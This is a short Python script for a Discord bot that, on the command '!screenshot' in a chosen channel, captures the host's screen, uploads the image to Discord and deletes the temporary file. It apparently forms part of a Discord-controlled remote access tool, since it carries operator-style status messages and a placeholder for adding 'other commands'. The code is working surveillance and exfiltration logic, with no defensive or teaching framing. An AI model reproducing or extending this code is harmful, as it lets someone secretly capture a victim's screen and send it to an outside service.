import discord # pip install discord
from discord.ext import commands
import os
from mss import mss # pip install mss

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents) # You can change

token = os.getenv('Your Discord Token')  # Replace with your method of securely storing the token
channel_id = 1  # Replace with your desired channel ID

@bot.event # Check stats
async def on_ready():
    print(f'We have logged in as {bot.user}')

@bot.event
async def on_message(message):
    if message.channel.id != channel_id:
        pass
    else:
        if message.content == "!screenshot": # if get !sceenshot in disocrd channel did you set will run this code
            try:
                with mss() as sct:
                    sct.shot(output=os.path.join(os.getenv('TEMP'), 'monitor.png'))

                file = discord.File(os.path.join(os.getenv('TEMP'), 'monitor.png'), filename='monitor.png')
                await message.channel.send('[*] Command successfully executed', file=file)

                os.remove(os.path.join(os.getenv('TEMP'), 'monitor.png'))
                print('Screenshot file deleted.')

            except Exception as e:
                print(f'An error occurred: {e}')
                await message.channel.send('[!] An error occurred during the screenshot process.')

        # Add similar improvements for other commands...

bot.run(token) # run bot
